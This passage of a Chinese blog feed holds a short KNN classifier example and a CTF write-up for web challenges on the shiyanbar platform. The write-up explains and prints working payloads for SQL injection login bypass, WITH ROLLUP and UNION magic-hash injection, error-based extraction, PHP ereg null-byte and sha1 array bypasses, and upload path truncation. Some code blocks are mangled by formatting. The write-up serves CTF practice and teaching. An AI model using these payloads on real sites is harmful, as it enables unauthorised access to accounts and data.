      <category term="代码执行" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>机器学习算法：最近邻(KNN)</title>
    <link href="http://yoursite.com/2017/07/25/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95%EF%BC%9A%E6%9C%80%E8%BF%91%E9%82%BB-KNN/"/>
    <id>http://yoursite.com/2017/07/25/机器学习算法：最近邻-KNN/</id>
    <published>2017-07-25T13:06:52.000Z</published>
    <updated>2017-07-26T10:42:19.587Z</updated>
    
    <content type="html"><![CDATA[<p>机器学习算法：最近邻(KNN)<br><a id="more"></a></p>
<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><h1 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h1><h1 id="tensorflow"><a href="#tensorflow" class="headerlink" title="tensorflow"></a>tensorflow</h1><h1 id="sklearn"><a href="#sklearn" class="headerlink" title="sklearn"></a>sklearn</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</div><div class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</div><div class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> load_breast_cancer</div><div class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</div><div class="line"><span class="keyword">from</span> sklearn.neighbors <span class="keyword">import</span> KNeighborsClassifier</div><div class="line"></div><div class="line">cancer = load_breast_cancer()</div><div class="line"></div><div class="line">print(cancer.DESCR)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">convertToDataframe</span><span class="params">()</span>:</span></div><div class="line">feature = cancer[<span class="string">'feature_names'</span>]</div><div class="line">df = pd.DataFrame(cancer.data,index=range(<span class="number">569</span>),columns=feature)</div><div class="line">df[<span class="string">'target'</span>] = cancer.target</div><div class="line"><span class="keyword">return</span> df</div><div class="line"></div><div class="line">print(<span class="string">"Now convert the dataset into dataframe:\n"</span>)</div><div class="line">cancerdf = convertToDataframe()</div><div class="line">print(cancerdf.head())</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">classDistribution</span><span class="params">(cancerdf)</span>:</span></div><div class="line">malignant = len(cancerdf[cancerdf[<span class="string">'target'</span>]==<span class="number">0</span>])</div><div class="line">benign = len(cancerdf[cancerdf[<span class="string">'target'</span>]==<span class="number">1</span>])</div><div class="line">index = [<span class="string">'malignant'</span>, <span class="string">'benign'</span>]</div><div class="line">target = pd.Series([malignant,benign],index=index)</div><div class="line"><span class="keyword">return</span> target</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">splitDataset</span><span class="params">(cancerdf)</span>:</span></div><div class="line">X = cancerdf[cancerdf.columns[:<span class="number">30</span>]]</div><div class="line">y = cancerdf[cancerdf.columns[<span class="number">30</span>]]</div><div class="line">X_train,X_test, y_train, y_test = train_test_split(X,y,random_state = <span class="number">0</span>)</div><div class="line"><span class="keyword">return</span> X_train, X_test, y_train, y_test</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">trainKNN</span><span class="params">(feature_data,class_data,k)</span>:</span></div><div class="line">knn = KNeighborsClassifier(n_neighbors=k)</div><div class="line">knn.fit(feature_data,class_data)</div><div class="line"><span class="keyword">return</span> knn</div><div class="line"></div><div class="line">print(<span class="string">"\nThe class distribution is:\n"</span>)</div><div class="line">print(classDistribution(cancerdf))</div><div class="line"></div><div class="line"></div><div class="line">print(<span class="string">"\nUsing train_test_split, split X and y into training and test sets (X_train, X_test, y_train, and y_test).using random_state=0\n"</span>)</div><div class="line"></div><div class="line">X_train, X_test, y_train, y_test = splitDataset(cancerdf)</div><div class="line"></div><div class="line">print(<span class="string">"X_train: "</span> ,X_train.shape)</div><div class="line">print(<span class="string">"X_test: "</span> ,X_test.shape)</div><div class="line">print(<span class="string">"y_train: "</span> ,y_train.shape)</div><div class="line">print(<span class="string">"y_test: "</span>, y_test.shape)</div><div class="line"></div><div class="line"></div><div class="line">print(<span class="string">"Now, training the Knn model: done!\n"</span>)</div><div class="line">knn = trainKNN(X_train,y_train,<span class="number">1</span>)</div><div class="line"></div><div class="line">print(<span class="string">"Predict the class label using the mean value for each feature.\n"</span>)</div><div class="line">print(<span class="string">"The mean value for each feature.\n"</span>)</div><div class="line">means = cancerdf.mean()</div><div class="line">print(means)</div><div class="line">means = means[:<span class="number">-1</span>].values.reshape(<span class="number">1</span>, <span class="number">-1</span>)</div><div class="line">means_predict = knn.predict(means)</div><div class="line">print(<span class="string">"The predict result : "</span>,means_predict)</div><div class="line"></div><div class="line"></div><div class="line">print(<span class="string">"Predict the class labels for the test set X_test"</span>)</div><div class="line">test_predict = knn.predict(X_test)</div><div class="line">print(<span class="string">"The prediction result ：\n"</span>,test_predict)</div><div class="line">print(<span class="string">"The prediction result accuracy : "</span>,knn.score(X_test,y_test))</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;机器学习算法：最近邻(KNN)&lt;br&gt;
    
    </summary>
    
      <category term="机器学习" scheme="http://yoursite.com/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="数据挖掘" scheme="http://yoursite.com/tags/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98/"/>
    
      <category term="机器学习" scheme="http://yoursite.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>实验吧-web-writeup</title>
    <link href="http://yoursite.com/2017/07/24/%E5%AE%9E%E9%AA%8C%E5%90%A7-web-writeup/"/>
    <id>http://yoursite.com/2017/07/24/实验吧-web-writeup/</id>
    <published>2017-07-24T13:27:27.000Z</published>
    <updated>2017-07-26T10:56:49.927Z</updated>
    
    <content type="html"><![CDATA[<p>实验吧-web-writeup（持续更新）<br><a id="more"></a></p>
<h1 id="登陆一下好吗"><a href="#登陆一下好吗" class="headerlink" title="登陆一下好吗"></a>登陆一下好吗</h1><p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">username=&apos;=&apos; &amp;password=&apos; = &apos;</div></pre></td></tr></table></figure></p>
<p>后端查询语句注入为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select XXX from XXX where user = &apos; &apos;=&apos; &apos; AND pass = &apos; &apos;=&apos; &apos;</div></pre></td></tr></table></figure></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ctf&#123;51d1bf8fb65a8c2406513ee8f52283e7&#125;</div></pre></td></tr></table></figure></p>
<h1 id="who-are-you"><a href="#who-are-you" class="headerlink" title="who are you?"></a>who are you?</h1><p>考点：基于时间的盲注，insert注入<br>ip伪装技巧：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">X-Forwarded-For</div><div class="line">Client-IP</div><div class="line">x-remote-IP</div><div class="line">x-originating-IP</div><div class="line">x-remote-addr</div></pre></td></tr></table></figure></p>
<h1 id="因缺思汀的绕过"><a href="#因缺思汀的绕过" class="headerlink" title="因缺思汀的绕过"></a>因缺思汀的绕过</h1><p>查看源代码。注释中有：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">source: source.txt</div></pre></td></tr></table></figure></p>
<p>访问得到源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'uname'</span>]) || !<span class="keyword">isset</span>($_POST[<span class="string">'pwd'</span>])) &#123;</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;form action="" method="post"&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;input name="uname" type="text"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;input name="pwd" type="text"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;input type="submit" /&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;/form&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;!--source: source.txt--&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">    <span class="keyword">die</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">AttackFilter</span><span class="params">($StrKey,$StrValue,$ArrReq)</span></span>&#123;  </div><div class="line">    <span class="keyword">if</span> (is_array($StrValue))&#123;</div><div class="line">        $StrValue=implode($StrValue);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.$ArrReq.<span class="string">"/is"</span>,$StrValue)==<span class="number">1</span>)&#123;   </div><div class="line">        <span class="keyword">print</span> <span class="string">"水可载舟，亦可赛艇！"</span>;</div><div class="line">        <span class="keyword">exit</span>();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$filter = <span class="string">"and|select|from|where|union|join|sleep|benchmark|,|\(|\)"</span>;</div><div class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key=&gt;$value)&#123;</div><div class="line">    AttackFilter($key,$value,$filter);</div><div class="line">&#125;</div><div class="line"></div><div class="line">$con = mysql_connect(<span class="string">"XXXXXX"</span>,<span class="string">"XXXXXX"</span>,<span class="string">"XXXXXX"</span>);</div><div class="line"><span class="keyword">if</span> (!$con)&#123;</div><div class="line">	<span class="keyword">die</span>(<span class="string">'Could not connect: '</span> . mysql_error());</div><div class="line">&#125;</div><div class="line">$db=<span class="string">"XXXXXX"</span>;</div><div class="line">mysql_select_db($db, $con);</div><div class="line">$sql=<span class="string">"SELECT * FROM interest WHERE uname = '&#123;$_POST['uname']&#125;'"</span>;</div><div class="line">$query = mysql_query($sql);</div><div class="line"><span class="keyword">if</span> (mysql_num_rows($query) == <span class="number">1</span>) &#123;</div><div class="line">    $key = mysql_fetch_array($query);</div><div class="line">    <span class="keyword">if</span>($key[<span class="string">'pwd'</span>] == $_POST[<span class="string">'pwd'</span>]) &#123;</div><div class="line">        <span class="keyword">print</span> <span class="string">"CTF&#123;XXXXXX&#125;"</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">print</span> <span class="string">"亦可赛艇！"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">	<span class="keyword">print</span> <span class="string">"一颗赛艇！"</span>;</div><div class="line">&#125;</div><div class="line">mysql_close($con);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>用到mysql中的<code>with rollup</code>技巧。用普通的select查询下；<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mysql&gt; SELECT uname,pass FROM test.table;</div><div class="line">+---------+------+</div><div class="line">| uname   | pass |</div><div class="line">+---------+------+</div><div class="line">| chybeta | 123  |</div><div class="line">+---------+------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure></p>
<p>在加上<code>group by pass with rollup</code>后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">mysql&gt; SELECT uname,pass FROM test.table group by pass with rollup;</div><div class="line">+---------+------+</div><div class="line">| uname   | pass |</div><div class="line">+---------+------+</div><div class="line">| chybeta | 123  |</div><div class="line">| chybeta | NULL |</div><div class="line">+---------+------+</div><div class="line">2 rows in set (0.01 sec)</div></pre></td></tr></table></figure></p>
<p>rollup在查询结果中加上了一行，并且pass字段的值为NULL。这样当我们post进的pwd的值为空，就能满足<code>$key[&#39;pwd&#39;] == $_POST[&#39;pwd&#39;]</code>的条件了。</p>
<p>在此之前我们还有一个条件要满足<code>mysql_num_rows($query) == 1</code>，我们要选择pass为NULL的单独的这一条记录。从源码分析可得，过滤了逗号，我们不能简单的使用<code>limit 1,1</code>这样的语法，而是可以使用<code>limit 1 offset 1</code>。就本地环境而言，比如</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mysql&gt; SELECT uname,pass FROM test.table group by pass with rollup limit 1 offset 1;</div><div class="line">+---------+------+</div><div class="line">| uname   | pass |</div><div class="line">+---------+------+</div><div class="line">| chybeta | NULL |</div><div class="line">+---------+------+</div><div class="line">1 row in set (0.01 sec)</div></pre></td></tr></table></figure>
<p>最后构造出的payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=&apos;  or 1=1 group by pwd with rollup limit 1 offset 2 #&amp;pwd=</div></pre></td></tr></table></figure></p>
<p>之所以为offset为2，是因为rollup是在查询结果最后加上一行，而我们通过<code>or 1=1</code>查询出来的不知道有多少行，所以这个<code>2</code>是fuzz出来的。</p>
<p>最后flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">CTF&#123;with_rollup_interesting&#125;</div></pre></td></tr></table></figure></p>
<h1 id="简单的sql注入"><a href="#简单的sql注入" class="headerlink" title="简单的sql注入"></a>简单的sql注入</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ctf5.shiyanbar.com/423/web/</div></pre></td></tr></table></figure>
<h1 id="Once-More"><a href="#Once-More" class="headerlink" title="Once More"></a>Once More</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">if (isset ($_GET[&apos;password&apos;])) &#123;</div><div class="line">	if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&apos;password&apos;]) === FALSE)</div><div class="line">	&#123;</div><div class="line">		echo &apos;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&apos;;</div><div class="line">	&#125;</div><div class="line">	else if (strlen($_GET[&apos;password&apos;]) &lt; 8 &amp;&amp; $_GET[&apos;password&apos;] &gt; 9999999)</div><div class="line">	&#123;</div><div class="line">		if (strpos ($_GET[&apos;password&apos;], &apos;*-*&apos;) !== FALSE)</div><div class="line">		&#123;</div><div class="line">			die(&apos;Flag: &apos; . $flag);</div><div class="line">		&#125;</div><div class="line">		else</div><div class="line">		&#123;</div><div class="line">			echo(&apos;&lt;p&gt;*-* have not been found&lt;/p&gt;&apos;);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	else</div><div class="line">	&#123;</div><div class="line">		echo &apos;&lt;p&gt;Invalid password&lt;/p&gt;&apos;;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>第一层判断通过ereg，要求只能出现字母和数字，但ereg有缺陷，可以用%00绕过。第二层判断要求位数少但要大于9999999，可以利用科学计数法。最里层要求出现<code>*-*</code>，用%00后面再加上即可。<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://ctf5.shiyanbar.com/web/more.php</div><div class="line">?password=9e9%00*-*</div></pre></td></tr></table></figure></p>
<p>flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">CTF&#123;Ch3ck_anD_Ch3ck&#125;</div><div class="line">```.</div><div class="line"># Guess Next Session</div></pre></td></tr></table></figure></p>
<p><a href="http://ctf5.shiyanbar.com/web/Session.php" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/Session.php</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">给了源代码</div></pre></td></tr></table></figure></p>
<p>&lt;?php<br>session_start();<br>if (isset ($_GET[‘password’])) {<br>    if ($_GET[‘password’] == $_SESSION[‘password’])<br>        die (‘Flag: ‘.$flag);<br>    else<br>        print ‘</p><p>Wrong guess.</p>‘;<br>}<p></p>
<p>mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));<br>?&gt;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">预测是个幌子。session_start()</div><div class="line"></div><div class="line">基于PHPSESSID=oso27id67fqu8hbvq57bacahn3作为身份认证信息，所以我们随便在PHPSESSID中加几个字母，这时服务器端的`$_SESSION[&apos;password&apos;]`为空，然后我们的password再置为空，</div><div class="line"></div><div class="line">![](https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170723/9.jpg?raw=true)</div><div class="line"></div><div class="line">![](https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170723/10.jpg?raw=true)</div><div class="line"></div><div class="line">然后就得到了flag：</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># FALSE</div></pre></td></tr></table></figure>
<p><a href="http://ctf5.shiyanbar.com/web/false.php" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/false.php</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">给了源码：</div><div class="line">```php</div><div class="line">&lt;?php</div><div class="line">if (isset($_GET[&apos;name&apos;]) and isset($_GET[&apos;password&apos;])) &#123;</div><div class="line">    if ($_GET[&apos;name&apos;] == $_GET[&apos;password&apos;])</div><div class="line">        echo &apos;&lt;p&gt;Your password can not be your name!&lt;/p&gt;&apos;;</div><div class="line">    else if (sha1($_GET[&apos;name&apos;]) === sha1($_GET[&apos;password&apos;]))</div><div class="line">      die(&apos;Flag: &apos;.$flag);</div><div class="line">    else</div><div class="line">        echo &apos;&lt;p&gt;Invalid password.&lt;/p&gt;&apos;;</div><div class="line">&#125;</div><div class="line">else&#123;</div><div class="line">	echo &apos;&lt;p&gt;Login first!&lt;/p&gt;&apos;;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>输入的name和password不能一样，之后的sha1比较用了<code>===</code>，不存在弱类型问题。但sha1不能处理数组，当我们传入<code>name[]=1&amp;password[]=2</code>时，会造成<code>sha1(Array) === sha1(Array)</code>，即<code>NULL===NULL</code>，从而吐出flag。本地测试如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$name = $_GET[&apos;name&apos;];</div><div class="line">var_dump(@sha1($name));</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170723/8.jpg?raw=true" alt=""></p>
<p>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ctf5.shiyanbar.com/web/false.php?name[]=1&amp;password[]=2</div></pre></td></tr></table></figure></p>
<h1 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h1><p>上传路径截断。</p>
<ol>
<li>burp抓包，修改为 uploads/cap.php .jpg</li>
<li>转到hex编码，将空格20，改为00</li>
<li>发包。</li>
</ol>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170723/7.jpg?raw=true" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;SimCTF_huachuan&#125;</div></pre></td></tr></table></figure>
<h1 id="程序逻辑问题"><a href="#程序逻辑问题" class="headerlink" title="程序逻辑问题"></a>程序逻辑问题</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ctf5.shiyanbar.com/web/5/index.php</div></pre></td></tr></table></figure>
<p>访问后查看源代码，有个index.txt。得到源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">if($_POST[user] &amp;&amp; $_POST[pass]) &#123;</div><div class="line">	$conn = mysql_connect(&quot;********&quot;, &quot;*****&quot;, &quot;********&quot;);</div><div class="line">	mysql_select_db(&quot;phpformysql&quot;) or die(&quot;Could not select database&quot;);</div><div class="line">	if ($conn-&gt;connect_error) &#123;</div><div class="line">		die(&quot;Connection failed: &quot; . mysql_error($conn));</div><div class="line">&#125;</div><div class="line">$user = $_POST[user];</div><div class="line">$pass = md5($_POST[pass]);</div><div class="line"></div><div class="line">$sql = &quot;select pw from php where user=&apos;$user&apos;&quot;;</div><div class="line">$query = mysql_query($sql);</div><div class="line">if (!$query) &#123;</div><div class="line">	printf(&quot;Error: %s\n&quot;, mysql_error($conn));</div><div class="line">	exit();</div><div class="line">&#125;</div><div class="line">$row = mysql_fetch_array($query, MYSQL_ASSOC);</div><div class="line">//echo $row[&quot;pw&quot;];</div><div class="line"></div><div class="line">  if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) &#123;</div><div class="line">	echo &quot;&lt;p&gt;Logged in! Key:************** &lt;/p&gt;&quot;;</div><div class="line">&#125;</div><div class="line">else &#123;</div><div class="line">    echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;);</div><div class="line"></div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>对$user没有过滤，尝试报错注入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">user=&apos;and extractvalue(1, concat(0x5c, (select pw from phpformysql.php limit 1)))#&amp;pass=1</div></pre></td></tr></table></figure></p>
<p>结果很尴尬：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">welcome to simplexue Error: SELECT command denied to user &apos;web6lo&apos;@&apos;localhost&apos; for table &apos;php&apos;</div></pre></td></tr></table></figure></p>
<p>好吧题目既然说是逻辑漏洞，接下来那就找咯。可以看到它的用户名和密码是分开判断的。并且用户名处存在注入。所以思路如下，我们给用户名传入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">user=&apos; union select &quot;0e830400451993494058024219903391&quot;</div></pre></td></tr></table></figure></p>
<p>构成的sql语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select pw from php where user=&apos; &apos; union select &quot;0e830400451993494058024219903391&quot;</div></pre></td></tr></table></figure></p>
<p>第一个查询结果为空，所以结果返回的是我们传入的<code>0e830400451993494058024219903391</code>，即此时，$row[pw]=0e830400451993494058024219903391。而md5(QNKCDZO)正是该0e字符串值。</p>
<p>最后的payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">user=&apos; union select &quot;0e830400451993494058024219903391&quot;#&amp;pass=QNKCDZO</div></pre></td></tr></table></figure></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SimCTF&#123;youhaocongming&#125;</div></pre></td></tr></table></figure></p>
<h1 id="what-a-fuck-这是什么鬼东西"><a href="#what-a-fuck-这是什么鬼东西" class="headerlink" title="what a fuck!这是什么鬼东西?"></a>what a fuck!这是什么鬼东西?</h1><p>jsfuck。f12里控制台运行一下，得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Ihatejs</div></pre></td></tr></table></figure></p>
<h1 id="php大法好"><a href="#php大法好" class="headerlink" title="php大法好"></a>php大法好</h1><p>访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ctf5.shiyanbar.com/DUTCTF/index.php</div></pre></td></tr></table></figure></p>
<p>得到提示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Can you authenticate to this website? index.php.txt</div></pre></td></tr></table></figure></p>
<p>访问，得到源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>(eregi(<span class="string">"hackerDJ"</span>,$_GET[id])) &#123;</div><div class="line">  <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;not allowed!&lt;/p&gt;"</span>);</div><div class="line">  <span class="keyword">exit</span>();</div><div class="line">&#125;</div><div class="line"></div><div class="line">$_GET[id] = urldecode($_GET[id]);</div><div class="line"><span class="keyword">if</span>($_GET[id] == <span class="string">"hackerDJ"</span>)</div><div class="line">&#123;</div><div class="line">  <span class="keyword">echo</span> <span 